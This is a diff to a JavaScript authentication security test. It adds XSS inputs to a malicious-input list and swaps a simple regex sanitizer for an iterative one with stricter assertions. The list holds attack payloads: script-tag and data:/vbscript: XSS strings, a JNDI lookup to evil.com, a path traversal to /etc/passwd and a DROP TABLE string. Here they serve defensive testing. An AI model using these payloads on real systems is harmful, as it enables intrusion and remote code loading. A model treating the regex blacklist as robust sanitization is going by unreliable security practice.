@@ -105,25 +105,43 @@ describe('Authentication Security Tests', () => {
       const maliciousInputs = [
         '<script>alert("xss")</script>',
         'javascript:void(0)',
+        'data:text/html,<script>alert(1)</script>',
+        'vbscript:msgbox("XSS")',
         '${jndi:ldap://evil.com/exp}',
         '../../../etc/passwd',
         'DROP TABLE users;',
       ];
 
       maliciousInputs.forEach(input => {
-        // Simple sanitization check - remove dangerous patterns
-        const sanitized = input
-          .replace(/<[^>]*>/g, '') // Remove HTML tags
-          .replace(/javascript:/gi, '') // Remove javascript: protocol
-          .replace(/\${.*}/g, '') // Remove template injection patterns
-          .replace(/\.\.\//g, '') // Remove path traversal
-          .replace(/DROP|DELETE|INSERT|UPDATE|SELECT/gi, ''); // Remove SQL keywords
+        // Enhanced sanitization with iterative processing to prevent bypass attempts
+        let sanitized = input;
+        let previousValue;
+        const maxIterations = 10;
+        let iterations = 0;
+        
+        // Iteratively sanitize until no more changes occur or max iterations reached
+        do {
+          previousValue = sanitized;
+          sanitized = sanitized
+            .replace(/<script[^>]*>[\s\S]*?<\/script[^>]*>/gi, '') // Remove complete script tags
+            .replace(/<[^>]*>/g, '') // Remove all HTML tags
+            .replace(/javascript:/gi, '') // Remove javascript: protocol
+            .replace(/data:[^,]*,/gi, '') // Remove data: URLs
+            .replace(/vbscript:/gi, '') // Remove vbscript: protocol
+            .replace(/\${[^}]*}/g, '') // Remove template injection patterns
+            .replace(/\.\.\//g, '') // Remove path traversal patterns
+            .replace(/DROP\s+TABLE|DELETE\s+FROM|INSERT\s+INTO|UPDATE\s+SET|SELECT\s+FROM/gi, ''); // Remove SQL injection patterns
+          iterations++;
+        } while (previousValue !== sanitized && iterations < maxIterations);
 
-        expect(sanitized).not.toContain('<script>');
-        expect(sanitized).not.toContain('javascript:');
+        // Additional validation after sanitization
+        expect(sanitized.toLowerCase()).not.toContain('<script');
+        expect(sanitized.toLowerCase()).not.toContain('javascript:');
+        expect(sanitized.toLowerCase()).not.toContain('data:');
+        expect(sanitized.toLowerCase()).not.toContain('vbscript:');
         expect(sanitized).not.toContain('${');
         expect(sanitized).not.toContain('../');
-        expect(sanitized.toLowerCase()).not.toContain('drop table');
+        expect(sanitized.toLowerCase()).not.toMatch(/drop\s+table/);
       });
     });
 
